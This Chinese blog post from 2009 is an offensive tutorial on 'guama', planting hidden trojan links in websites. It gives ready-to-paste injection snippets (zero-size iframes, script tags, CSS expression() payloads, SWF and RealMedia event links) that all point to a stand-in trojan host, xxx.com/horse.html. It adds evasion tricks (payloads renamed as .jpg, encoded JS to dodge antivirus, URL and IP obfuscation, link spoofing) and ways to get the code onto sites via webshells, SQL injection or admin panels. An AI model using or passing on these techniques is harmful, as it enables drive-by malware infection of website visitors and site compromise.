---
title: 详解挂马方法和技巧
description: 1.挂马的N种方法(1)HTML挂马法。常规的HTML挂马方法一般是在网页中插入一条iframe语句，像
date: 2009-03-06 11:27:29
category: 技术文章
tags: ['技术类', '技巧', 'iframe']
post_id: 805
alias: xiangjie-guama-fangfa-jiqiao
ViewNums: 5101
---

**1.挂马的N种方法**

(1) [HTML挂马法](/blog/xiangjie-guama-fangfa-jiqiao)。
常规的HTML挂马方法一般是在网页中插入一条iframe语句，像
```html
<iframe src=http://www.xxx.com/horse.html width=0 height=0></iframe>
```
。查看站点是否被挂，一般是查找一下关键词iframe。

(2) 再隐藏一点的就是[js挂马](/blog/xiangjie-guama-fangfa-jiqiao)了。
像再原来的网页中写入
```html
<script str=http://www.xxx.com/horse.js></script>，horse里的js写法一般为 document.write(’http://www.xxx.com/horse.html’>;，或者专业一点的写法是 top.document.body.innerHTML  = top.document.body.innerHTML + ‘
<iframe src=”http://www.xxx.com/horse.htm/”></iframe>’;
```

。不过第2种写法要注意：是原来的网页种要有body标签。

(3) 在 [css中挂马](/blog/xiangjie-guama-fangfa-jiqiao)。
这个方法就是在css中写入：
```css
body {
hytop:expression(top.document.body.innerHTML = top.document.body.innerHTML + ‘
< iframe src=”http://www.xxx.com/horse.html/”></>’);
}
```
然后在主页中调用这个CSS，代码类似
```html
<link href=”http://www.7747.net/css.css” rel=”stylesheet” type=”text/css”>
```
这样的。在csdn 中对expression的解释是：IE5及其以后版本支持在CSS中使用expression，用来吧CSS属性和Javascript表达式关联起来，这里的CSS属性可以是元素固有的属性，也可以是自定义属性。也就是说CSS属性后面可以是一段Javasccript表达式，CSS属性的值等于 Javascript表达式计算的结果。在表达式中可以是直接一用元素自身的属性和方法，也可以使用其它浏览器对象。这个表达式就好像是在这个元素的一个成员函数中一样。整个解释关键点是expression可以在css中引入js语句，所以我们可用于挂马。不过写的语句值可以远程调用，本地不可以。

(4) 在swf中挂马
网上有一些[swf挂马](/blog/xiangjie-guama-fangfa-jiqiao)的工具，可以用工具替换原来网页中的swf或单独把swf发给对方，一可以单独作一个可显示swf页的网页。在网页中插入swf的语法一般格式为：
```html
<OBJECT classid=clsid:D27CDB6E-AE6D-11cf-96B8-444553540000 codebase=http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=5.0.0.0 WIDTH=760 NAME=quality VALUE=high> <EMBED src=”http://www.7747.net/xxx.swf” quality=high pluginspage=http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash type=application/x-shockwave-flash width=760 height=60></EMBED></OBJECT>
```
(5) 在影音文件中挂马。
所需工具是RealMedia Editor，打开工具后，然后依次选择“文件”－“打开Real媒体文件”，然后选择需要编辑的视频文件，其格式必须是RealOne公司的以RM或 RMVB为扩展名的文件。接着，新建一个文本，在里面输入u 00:00:10:0 00:00:30.0&&_rpexternal&&http://www.xxx.com/horse.htm
(00:00:10.0就是发生第一事件的时间，这里是让计算机弹出网页；00:00:30.0同样，这是第二次发生的时间，在0时0分第30秒0微妙时弹出窗口；而后面的URL地址就是连接指定的木马地址。)
输入完毕后并保存，然后依次选择“工具”－“合并事件”，导入刚才的文本。当合并完成后，依次选择“文本”－“Real文件另存为”，保存好即可。
最后把生成的视频文件发布网上，当对方观看同时就会连接到你指定的木马地址。

**2.挂马的技巧**

挂马首先要求的是隐蔽性，这样挂的时间才能长。像在SWF、JS、RM中挂马就是比较隐蔽了，但是还可再用到些技巧。

(1)远程任意后缀执行HTML
可以把horse.html改成horse.jpg之类的后缀，然后语句写成
```html
<iframe src=/uploadfile/200902/20090220105353594.jpg width=0 height=0></iframe>
```
。js也可以，语句为
```html
<script src=/uploadfile/200902/20090220105353594.jpg></script>
```
，甚至js的不要后缀名都可以。

(2)JS的加密
为了保护网页木马的代码，可以把JS内容加密，还能躲开杀软的作用。如果使用ENCODE加密方式，加密后的JS调用语句就用< script language=”jscript”.encode”src=http://www.xxx.com/horse.txt& gt;</script>。除此方法外，还有其它更多的方法！

(3)URL的变形
URL的变形方法也有很多，例如将url的16进制转换为encod编码等。如果是涉及到URL欺骗的方法就更多了，不过多数的URL欺骗，像利用@的技巧，IE都已经打补丁了。但现在有个漏洞仍然有效，代码如下：
```html
<a id=”CZY” href=”http://www.baidu.com”></a>
<div>
<a href=”http://www.google.cn” target=”_blank”>
<table>
<caption>
<a href=”http://www.google.cn” target=”_blank”>
<label for=”CZY”>
<u style=”cursor: pointer: color: blue”>
Google</u>
</label></a></caption></table></a></div>
```
保存该代码为网页后，鼠标移动到Google这个链接上时，IE状态栏显示的是http://www.google.cn，但点击链接后却打开http: //www.baidu.com网站。如果你的网马可以用IP地址访问到的话，IP地址也可以进行转换的。像127.0.0.1这样的IP还可以变为 2130706433、0×7f.0×00.0×00.0×01、0177.0000.0000.0001等等，这只不过是8进制、10进制、16进制、的转换而已。

**3.如何才能挂到马**
拿到了webshell的话，[挂马](/blog/xiangjie-guama-fangfa-jiqiao)自然是很简单了。但是拿不到的情况下，如果注入点有update权限，我们可以仔细查找首页中的某条新闻的调用链接，然后update数据库达到我们的目的。如果可进入后台，我没就可以在一些发公告的地方写入自己的木马代码（不过千万别打乱前台html源文件里的代码逻辑）。

